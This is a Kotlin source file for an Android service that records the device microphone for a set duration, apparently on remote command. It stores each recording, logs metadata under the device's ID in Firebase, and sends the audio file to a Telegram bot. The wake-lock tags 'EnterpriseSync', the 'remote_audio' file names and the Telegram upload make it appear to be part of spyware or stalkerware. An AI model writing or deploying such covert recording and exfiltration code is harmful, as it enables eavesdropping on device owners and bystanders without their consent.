package com.example.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.MainActivity
import com.example.data.local.AppDatabase
import com.example.data.local.AudioRecordingEntity
import com.example.data.sync.AudioRecorderHelper
import com.example.data.sync.TelegramBotManager
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AudioRecordingService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: android.net.wifi.WifiManager.WifiLock? = null

    companion object {
        const val EXTRA_DURATION_SEC = "extra_duration_sec"
        const val NOTIFICATION_ID = 2002
        const val CHANNEL_ID = "audio_recording_service_channel"

        @Volatile
        var isRecordingActive = false
            private set

        fun startService(context: Context, durationSec: Int) {
            val intent = Intent(context, AudioRecordingService::class.java).apply {
                putExtra(EXTRA_DURATION_SEC, durationSec)
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e("AudioRecordingService", "Failed to start service directly: ${e.message}")
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val durationSec = intent?.getIntExtra(EXTRA_DURATION_SEC, 10)?.coerceAtLeast(3) ?: 10
        Log.i("AudioRecordingService", "onStartCommand called for duration=$durationSec seconds.")

        // Start foreground immediately with ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        startForegroundWithMicrophonePrivilege()

        acquireLocks(durationSec)

        serviceScope.launch {
            executeForegroundRecording(durationSec)
        }

        return START_NOT_STICKY
    }

    private fun startForegroundWithMicrophonePrivilege() {
        val notification = buildForegroundNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                )
                Log.d("AudioRecordingService", "startForeground SUCCESS with FOREGROUND_SERVICE_TYPE_MICROPHONE.")
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Throwable) {
            Log.e("AudioRecordingService", "Error in startForeground with MICROPHONE: ${e.message}")
            try {
                startForeground(NOTIFICATION_ID, notification)
            } catch (_: Throwable) {}
        }
    }

    private fun acquireLocks(durationSec: Int) {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = pm?.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "EnterpriseSync::AudioRecordForegroundServiceWakeLock"
            )
            wakeLock?.acquire((durationSec + 60) * 1000L)

            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            wifiLock = wm?.createWifiLock(
                android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF,
                "EnterpriseSync::AudioRecordWifiLock"
            )
            wifiLock?.acquire()
        } catch (e: Exception) {
            Log.w("AudioRecordingService", "Failed to acquire power/wifi locks: ${e.message}")
        }
    }

    private suspend fun executeForegroundRecording(durationSec: Int) {
        isRecordingActive = true
        val audioHelper = AudioRecorderHelper(applicationContext)
        val nowMs = System.currentTimeMillis()
        val deviceId = try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }

        try {
            Log.d("AudioRecordingService", "Beginning audio recording session in foreground...")
            val base64Data = audioHelper.startRecording(durationSec)
            if (base64Data != null) {
                val base64Content = base64Data.substringAfter(",")
                val audioBytes = Base64.decode(base64Content, Base64.NO_WRAP)
                val audioExt = "wav"
                val fileName = "remote_audio_${nowMs}.$audioExt"

                // Save locally to persistent app files
                val persistentFile = File(filesDir, fileName)
                try {
                    persistentFile.writeBytes(audioBytes)
                } catch (e: Exception) {
                    Log.w("AudioRecordingService", "Failed to save audio to filesDir: ${e.message}")
                }

                // Insert into Room DB
                val database = AppDatabase.getInstance(applicationContext)
                val entity = AudioRecordingEntity(
                    filePath = persistentFile.absolutePath,
                    durationSeconds = durationSec,
                    fileSize = audioBytes.size.toLong(),
                    mimeType = "audio/wav",
                    createdAt = nowMs,
                    isSynced = false,
                    retryCount = 0
                )
                val recordingId = try {
                    database.audioRecordingDao().insertRecording(entity)
                } catch (_: Exception) { -1L }

                // Upload metadata to Firebase RTDB
                val recData = mapOf(
                    "timestamp" to nowMs,
                    "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
                    "durationSeconds" to durationSec,
                    "extension" to audioExt,
                    "fileSizeBytes" to audioBytes.size,
                    "status" to "Recorded in Foreground Service"
                )
                try {
                    val rtdb = FirebaseDatabase.getInstance()
                    rtdb.getReference("devices/$deviceId/audio_recordings/$nowMs").setValue(recData)
                    rtdb.getReference("devices/$deviceId/audio_latest").setValue(recData)
                } catch (e: Exception) {
                    Log.e("AudioRecordingService", "Failed to upload metadata to RTDB: ${e.message}")
                }

                // Send audio to Telegram
                var telegramSuccess = false
                try {
                    val telegramBot = TelegramBotManager(applicationContext)
                    telegramSuccess = telegramBot.sendAudio(
                        audioBytes,
                        fileName,
                        "Audio Recording - Duration: $durationSec sec (${(audioBytes.size / 1024)} KB)"
                    )
                    Log.d("AudioRecordingService", "Telegram upload status: $telegramSuccess")
                } catch (e: Exception) {
                    Log.e("AudioRecordingService", "Failed to upload audio to Telegram: ${e.message}")
                }

                if (recordingId != -1L) {
                    try {
                        database.audioRecordingDao().updateSyncStatus(
                            recordingId,
                            telegramSuccess,
                            if (telegramSuccess) 0 else 1,
                            if (telegramSuccess) "" else "Telegram upload pending"
                        )
                    } catch (_: Exception) {}
                }
            } else {
                Log.e("AudioRecordingService", "Audio recording returned null base64Data.")
            }
        } catch (e: Exception) {
            Log.e("AudioRecordingService", "Error during foreground audio recording: ${e.message}", e)
        } finally {
            isRecordingActive = false
            try { audioHelper.cleanup() } catch (_: Exception) {}
            try {
                if (wakeLock?.isHeld == true) wakeLock?.release()
                if (wifiLock?.isHeld == true) wifiLock?.release()
            } catch (_: Exception) {}

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    stopForeground(STOP_FOREGROUND_REMOVE)
                } else {
                    @Suppress("DEPRECATION")
                    stopForeground(true)
                }
            } catch (_: Exception) {}
            stopSelf()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Microphone Recording Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Active microphone recording service"
                setSound(null, null)
                enableVibration(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            nm?.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val launchIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Audio Recording Active")
            .setContentText("Microphone session in progress")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        isRecordingActive = false
        serviceJob.cancel()
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
            if (wifiLock?.isHeld == true) wifiLock?.release()
        } catch (_: Exception) {}
    }
}
